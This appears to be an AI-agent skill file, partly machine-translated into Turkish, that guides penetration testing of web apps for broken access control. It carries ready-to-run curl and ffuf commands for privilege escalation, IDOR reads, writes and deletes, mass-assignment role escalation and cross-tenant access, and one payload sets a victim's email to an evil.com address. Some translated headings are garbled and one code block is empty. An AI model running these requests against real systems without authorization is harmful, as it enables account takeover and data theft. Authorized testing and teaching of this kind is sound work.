---
name: testing-for-broken-access-control
description: Systematically testing web applications for broken access control vulnerabilities including privilege escalation, missing function-level checks, and insecure direct object references.
tags:
- web-security
- owasp
- authorization
- fetih
- privilege-escalation
- web-application-security
- cybersecurity
- access-control
- penetration-testing
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- access
- api
- authentication
- broken
- control
- email
- endpoint
- http
- log
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
adapted_for: fetih
---

# Testing for Broken Access Control


## Ne Zaman Kullanılır

- During authorized penetration tests as the primary assessment for OWASP A01:2021 - Broken Access Control
- evaluating yaparken: role-based access control (RBAC) implementations across all application endpoints
- For testing multi-tenant applications where users in one organization should not access another's data
- assessing yaparken API endpoints for missing or inconsistent authorization checks
- During security audits where privilege escalation and unauthorized access are primary concerns

## Ön Gereksinimler

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: With Authorize extension for automated access control testing
- **Multiple test accounts**: Accounts at each role level (admin, manager, user, guest)
- **Application role matrix**: Documentation of what each role should and should not access
- **curl/httpie**: For manual endpoint testing with different authentication contexts
- **ffuf**: For discovering hidden endpoints that may lack access controls

## İş Akışı

### Adım 1: Map All Endpoints and Şunu oluştur:ccess Control Matrix

Document every endpoint and the expected access level for each role.

```bash


ffuf -u "https://target.example.com/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -mc 200,301,302,403 -fc 404 \
  -H "Authorization: Bearer $USER_TOKEN" \
  -o endpoints.json -of json

ffuf -u "https://target.example.com/api/v1/FUZZ" \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403,405 -fc 404 \
  -H "Authorization: Bearer $USER_TOKEN"
```

### Adım 2: Configure Automated Access Control Testing

Kur: Burp Authorize extension for parallel role-based testing.

```


#


```

### Adım 3: Test Vertical Privilege Escalation

Attempt to access higher-privilege functionality with lower-privilege accounts.

```bash
ADMIN_TOKEN="Bearer admin_jwt_here"
MANAGER_TOKEN="Bearer manager_jwt_here"
USER_TOKEN="Bearer user_jwt_here"

ADMIN_ENDPOINTS=(
  "GET /admin/dashboard"
  "GET /admin/users"
  "POST /admin/users/create"
  "PUT /admin/settings"
  "DELETE /admin/users/5"
  "GET /admin/logs"
  "GET /admin/reports/export"
  "POST /admin/backup"
)

for entry in "${ADMIN_ENDPOINTS[@]}"; do
  method=$(echo "$entry" | cut -d' ' -f1)
  endpoint=$(echo "$entry" | cut -d' ' -f2)
  echo -n "$method $endpoint (as user): "
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" \
    -H "Authorization: $USER_TOKEN" \
    -H "Content-Type: application/json" \
    "https://target.example.com$endpoint")
  if [ "$status" == "200" ] || [ "$status" == "201" ]; then
    echo "VULNERABLE ($status)"
  else
    echo "OK ($status)"
  fi
done

curl -s -o /dev/null -w "%{http_code}" \
  -X POST \
  -H "Authorization: $USER_TOKEN" \
  -H "X-HTTP-Method-Override: DELETE" \
  "https://target.example.com/admin/users/5"

for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo -n "$method /admin/users: "
  curl -s -o /dev/null -w "%{http_code}" \
    -X "$method" \
    -H "Authorization: $USER_TOKEN" \
    "https://target.example.com/admin/users"
  echo
done
```

### Adım 4: Test Horizontal Privilege Escalation

Şunu doğrula: users cannot access resources belonging to other users at the same privilege level.

```bash
USER_A_TOKEN="Bearer user_a_jwt"

RESOURCES=(
  "/api/users/102/profile"
  "/api/users/102/orders"
  "/api/users/102/messages"
  "/api/users/102/documents"
  "/api/users/102/settings"
  "/api/users/102/payment-methods"
)

for resource in "${RESOURCES[@]}"; do
  echo -n "GET $resource: "
  response=$(curl -s -w "\n%{http_code}" \
    -H "Authorization: $USER_A_TOKEN" \
    "https://target.example.com$resource")
  status=$(echo "$response" | tail -1)
  body_len=$(echo "$response" | head -n -1 | wc -c)
  if [ "$status" == "200" ] && [ "$body_len" -gt 50 ]; then
    echo "VULNERABLE ($status, $body_len bytes)"
  else
    echo "OK ($status)"
  fi
done

curl -s -X PUT \
  -H "Authorization: $USER_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"Hacked","email":"hacked@evil.com"}' \
  "https://target.example.com/api/users/102/profile" -w "%{http_code}"

curl -s -X DELETE \
  -H "Authorization: $USER_A_TOKEN" \
  "https://target.example.com/api/users/102/documents/1" -w "%{http_code}"
```

### Adım 5: Test Function-Level Access Control

Şunu doğrula: specific functions enforce authorization properly.

```bash
PROTECTED_ENDPOINTS=(
  "/api/user/profile"
  "/api/transactions"
  "/api/settings"
  "/admin/dashboard"
  "/api/export/users"
)

for endpoint in "${PROTECTED_ENDPOINTS[@]}"; do
  echo -n "No auth: GET $endpoint: "
  curl -s -o /dev/null -w "%{http_code}" \
    "https://target.example.com$endpoint"
  echo
done

curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer invalid_token_here" \
  "https://target.example.com/api/user/profile"


curl -s -X PUT \
  -H "Authorization: $USER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin","is_admin":true,"permissions":["admin","superuser"]}' \
  "https://target.example.com/api/users/101/profile"

curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"new@test.com","password":"Test123!","role":"admin"}' \
  "https://target.example.com/api/auth/register"
```

### Adım 6: Test Multi-Tenant Isolation

Şunu doğrula: tenant boundaries are enforced in multi-tenant applications.

```bash
TENANT_A_TOKEN="Bearer tenant_a_user_jwt"

curl -s -H "Authorization: $TENANT_A_TOKEN" \
  "https://target.example.com/api/organizations/tenant-b-id/users" | jq .

curl -s -H "Authorization: $TENANT_A_TOKEN" \
  "https://target.example.com/api/organizations/tenant-b-id/settings" | jq .

curl -s -H "Authorization: $TENANT_A_TOKEN" \
  -H "X-Tenant-ID: tenant-b-id" \
  "https://target.example.com/api/users" | jq .

curl -s -X POST \
  -H "Authorization: $TENANT_A_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"tenant_id":"tenant-b-id","query":"SELECT * FROM users"}' \
  "https://target.example.com/api/reports/custom"

ffuf -u "https://target.example.com/api/organizations/FUZZ" \
  -w <(seq 1 100) \
  -H "Authorization: $TENANT_A_TOKEN" \
  -mc 200 -t 10 -rate 20
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Vertical Privilege Escalation** | Lower-privilege user accessing higher-privilege functionality (user -> admin) |
| **Horizontal Privilege Escalation** | User accessing another user's resources at the same privilege level |
| **Function-Level Access Control** | Authorization checks on specific features/functions regardless of URL |
| **RBAC** | Role-Based Access Control - permissions assigned to roles, roles assigned to users |
| **ABAC** | Attribute-Based Access Control - permissions based on user/resource/environment attributes |
| **Multi-Tenant Isolation** | Ensuring data and functionality separation between different organizations/tenants |
| **Insecure Direct Object Reference** | Accessing objects by manipulating identifiers without authorization checks |
| **Missing Function-Level Check** | Endpoint exists but does not verify the caller has permission to invoke it |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception and role-based testing |
| **Authorize (Burp Extension)** | Automated access control testing across sessions |
| **AutoRepeater (Burp Extension)** | Automatically replays requests with different auth contexts |
| **Postman** | API testing with environment switching between roles |
| **ffuf** | Discovering hidden endpoints that may lack access controls |
| **OWASP ZAP** | Access control testing with context-aware scanning |

## Common Scenarios

### Scenario 1: Admin Panel Without Auth Check
The `/admin/dashboard` endpoint returns the admin panel when accessed with a regular user's session token. The front-end hides the admin menu, but the back-end does not enforce role checks.

### Scenario 2: API Endpoint Missing Authorization
The `DELETE /api/users/{id}` endpoint checks for authentication (valid token) but not authorization (admin role). Any authenticated user can delete any other user's account.

### Scenario 3: Tenant Data Leakage
A SaaS application uses `tenant_id` in API request headers. Changing the `X-Tenant-ID` header to another tenant's ID returns their data, bypassing tenant isolation.

### Scenario 4: Mass Assignment Role Escalation
The user profile update endpoint at `PUT /api/users/{id}` accepts a `role` field in the JSON body. Submitting `"role":"admin"` alongside a profile update elevates the user to administrator.

## Output Format

```
## Broken Access Control Assessment Report

**Target**: target.example.com
**Assessment Date**: 2024-01-15
**OWASP Category**: A01:2021 - Broken Access Control

### Access Control Matrix Results
| Endpoint | Admin | Manager | User | Guest | Expected | Actual |
|----------|-------|---------|------|-------|----------|--------|
| GET /admin/dashboard | 200 | 200 | 200 | 302 | Admin only | FAIL |
| DELETE /api/users/{id} | 200 | 200 | 200 | 401 | Admin only | FAIL |
| GET /api/users/other/profile | 200 | 200 | 200 | 401 | Own only | FAIL |
| PUT /api/users/other/settings | 200 | 200 | 200 | 401 | Own only | FAIL |
| GET /api/org/other-tenant | 200 | 200 | 200 | 401 | Same tenant | FAIL |

### Critical Bul:ings
1. **Vertical Escalation**: Regular users can access /admin/* endpoints
2. **Horizontal IDOR**: Users can read/modify other users' profiles
3. **Tenant Isolation**: Cross-tenant data access via header manipulation
4. **Mass Assignment**: Role escalation via profile update endpoint

### Impact
- Complete administrative access for any authenticated user
- Full user data access across all accounts (15,000+ users)
- Cross-tenant data breach affecting 200+ organizations
- Account takeover via profile modification

### Recommendation
1. Implement server-side authorization checks on every endpoint
2. Use a centralized authorization middleware/framework
3. Enforce object-level authorization (verify ownership before access)
4. Validate tenant context server-side, never from client headers
5. Use allowlists for mass assignment (only permit expected fields)
6. Implement audit logging for all access control decisions
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: 41994452727f5d2f
-->

